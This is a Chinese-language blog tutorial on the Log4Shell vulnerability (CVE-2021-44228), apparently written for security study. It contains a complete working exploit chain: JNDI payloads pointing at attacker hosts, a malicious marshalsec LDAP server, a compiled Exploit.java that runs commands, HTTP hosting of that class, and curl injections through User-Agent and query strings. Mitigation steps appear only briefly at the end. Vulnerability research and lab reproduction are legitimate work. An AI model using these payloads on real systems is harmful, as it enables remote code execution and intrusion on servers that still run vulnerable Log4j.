---
title: "Log4Shell (CVE-2021-44228) 漏洞深度解析与利用"
date: 2026-03-01T13:53:00+08:00
draft: false
categories: ["漏洞复现"]
tags: ["Log4j", "RCE", "CVE-2021-44228"]
image: "/blog-cover-default.jpg"
description: "Log4Shell 漏洞深度解析与利用教程"
---

# Log4Shell (CVE-2021-44228) 漏洞深度解析与利用

> **漏洞等级：** CVSS 10.0 (严重)  
> **影响范围：** Apache Log4j 2.0-2.14.1  
> **披露时间：** 2021 年 12 月 10 日

---

## 漏洞概述

Log4Shell 是 Apache Log4j 日志库中的一个远程代码执行漏洞，被称为"本世纪最严重的漏洞之一"。该漏洞允许攻击者通过构造特殊的日志消息，在目标服务器上执行任意代码。

### 受影响版本

```
Apache Log4j 2.0-beta9 至 2.14.1
```

### 漏洞原理

Log4j 在处理日志消息时，会解析 JNDI (Java Naming and Directory Interface) 查找表达式。攻击者可以构造如下 payload：

```java
${jndi:ldap://attacker.com/exploit}
```

当这个字符串被记录到日志时，Log4j 会尝试连接攻击者控制的 LDAP 服务器，并下载执行恶意代码。

---

## 环境搭建

### 1. 搭建漏洞靶场

```bash
# 使用 Docker 快速搭建
docker run --name log4shell-vuln -p 8080:8080 \
  ghcr.io/christophetd/log4shell-vulnerable:latest
```

### 2. 验证漏洞存在

```bash
# 发送测试请求
curl http://target:8080/api/login \
  -H "User-Agent: ${jndi:ldap://your-server.com/test}"
```

---

## 漏洞利用

### 1. 搭建恶意 LDAP 服务器

```bash
# 使用 marshalsec 工具
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests

# 启动 LDAP 服务器
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://your-server.com/#Exploit"
```

### 2. 准备恶意代码

```java
// Exploit.java
public class Exploit {
    public Exploit() {
        try {
            Runtime.getRuntime().exec("whoami");
            // 或其他恶意操作
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### 3. 编译并托管

```bash
# 编译
javac Exploit.java

# 使用 Python 快速托管
python3 -m http.server 80
```

### 4. 发送攻击 payload

```bash
# 常见注入点
curl http://target/api/login \
  -H "User-Agent: ${jndi:ldap://your-ip:1389/Exploit}"

curl http://target/api/search?q=${jndi:ldap://your-ip:1389/Exploit}
```

---

## 防御方案

### 1. 升级 Log4j

```
升级到 Log4j 2.17.0 或更高版本
```

### 2. 临时缓解措施

```bash
# 设置 JVM 参数
-Dlog4j2.formatMsgNoLookups=true

# 或移除 JndiLookup 类
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

---

## 参考资源

- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j 安全公告](https://logging.apache.org/log4j/2.x/security.html)
- [Log4Shell POC](https://github.com/kozmer/log4j-shell-poc)

---

*本文仅用于安全研究与教育目的*
